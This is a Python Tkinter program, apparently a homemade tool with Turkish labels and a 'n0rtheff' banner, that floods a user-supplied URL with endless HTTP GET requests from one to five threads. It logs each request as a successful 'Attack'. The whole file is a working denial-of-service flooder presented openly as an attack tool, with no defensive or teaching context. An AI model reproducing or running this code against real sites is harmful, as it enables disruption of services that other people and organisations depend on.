import requests
from tkinter import *
from tkinter import Tk
from threading import Thread
from tkinter import messagebox


def start():
    uyari = ''

    if E1.get() and E2.get():

        islemSayisi = '{}'.format(E2.get())
        url = '{}'.format(E1.get())

        if islemSayisi == '1':

            def islem1():
                while True:
                    bomb = requests.get(url)
                    sonuc = bomb.status_code
                    yazi = "Attack to {} is succesfull. - {} \n".format(url, sonuc)
                    metin_alani.tag_configure('style', foreground='green', font=('Arial', 10, 'bold'))

                    metin_alani.insert(END, yazi, 'style')

            t1 = Thread(target=islem1)
            t1.start()

        elif islemSayisi == '2':

            def islem2():
                while True:
                    bomb = requests.get(url)
                    sonuc = bomb.status_code
                    yazi = "Attack to {} is succesfull. - {} \n".format(url, sonuc)
                    metin_alani.tag_configure('style', foreground='green', font=('Arial', 10, 'bold'))

                    metin_alani.insert(END, yazi, 'style')

            t1 = Thread(target=islem2)
            t1.start()

            t2 = Thread(target=islem2)
            t2.start()

        elif islemSayisi == '3':

            def islem3():
                while True:
                    bomb = requests.get(url)
                    sonuc = bomb.status_code
                    yazi = "Attack to {} is succesfull. - {} \n".format(url, sonuc)
                    metin_alani.tag_configure('style', foreground='green', font=('Arial', 10, 'bold'))

                    metin_alani.insert(END, yazi, 'style')

            t1 = Thread(target=islem3)
            t1.start()

            t2 = Thread(target=islem3)
            t2.start()

            t3 = Thread(target=islem3)
            t3.start()

        elif islemSayisi == '4':

            def islem4():
                while True:
                    bomb = requests.get(url)
                    sonuc = bomb.status_code
                    yazi = "Attack to {} is succesfull. - {} \n".format(url, sonuc)
                    metin_alani.tag_configure('style', foreground='green', font=('Arial', 10, 'bold'))

                    metin_alani.insert(END, yazi, 'style')

            t1 = Thread(target=islem4)
            t1.start()

            t2 = Thread(target=islem4)
            t2.start()

            t3 = Thread(target=islem4)
            t3.start()

            t4 = Thread(target=islem4)
            t4.start()

        elif islemSayisi == '5':

            def islem5():
                while True:
                    bomb = requests.get(url)
                    sonuc = bomb.status_code
                    yazi = "Attack to {} is succesfull. - {} \n".format(url, sonuc)
                    metin_alani.tag_configure('style', foreground='green', font=('Arial', 10, 'bold'))

                    metin_alani.insert(END, yazi, 'style')

            t1 = Thread(target=islem5)
            t1.start()

            t2 = Thread(target=islem5)
            t2.start()

            t3 = Thread(target=islem5)
            t3.start()

            t4 = Thread(target=islem5)
            t4.start()

            t5 = Thread(target=islem5)
            t5.start()
        else:

            messagebox.showerror('işlem hatası',
                                 'İŞLEM YÜKÜ ÇOK FAZLA, VEYA HATALI BİR GİRİŞ YAPILDI\nLÜTFEN DOĞRU BİLGİLERİ GİRDİGİNİZDEN EMİN OLUNUZ!!')


    else:

        messagebox.showerror('hata', 'Fill ')


master = Tk()
master.geometry('500x400+200+200')
master.resizable(False, False)

frame1 = Frame(master, bg='black')
frame1.place(relx=0, rely=0, relwidth=1.0, relheight=0.1)
Label(frame1, text='n0rtheff', bg='black', fg='#14e119', font='Consolas').pack(pady=10, anchor=S)

frame2 = Frame(master, bg='black')
frame2.place(relx=0, rely=0.1, relwidth=1.0, relheight=0.2)
Label(frame2, text='  IP/Treatment Amount', bg='black', fg='#14e119', font='Consolas').pack(padx=10, pady=10, side=LEFT)

E1 = Entry(frame2, bd=1)
E1.pack(padx=5, pady=10, side=LEFT)

E2 = Entry(frame2, bd=1, width=5)
E2.pack(padx=5, pady=10, side=LEFT)

btn = Button(frame2, text='START', bg='green', fg='white', font='Consolas', command=start)
btn.pack(padx=5, pady=10, side=LEFT)

frame3 = Frame(master, bg='black')
frame3.place(relx=0, rely=0.3, relwidth=1.0, relheight=0.7)
Label(frame3, text='Terminal Info Panel', bg='black', fg='#14e119', font='Consolas').pack(pady=10, anchor=S)
metin_alani = Text(frame3, height=13, width=57)
metin_alani.tag_configure('style', foreground='#000000', font=('Consolas', 10))
metin_alani.pack()
bilgi=""">>Attack Info<<
"""
metin_alani.insert(END, bilgi, 'style')
master.mainloop()
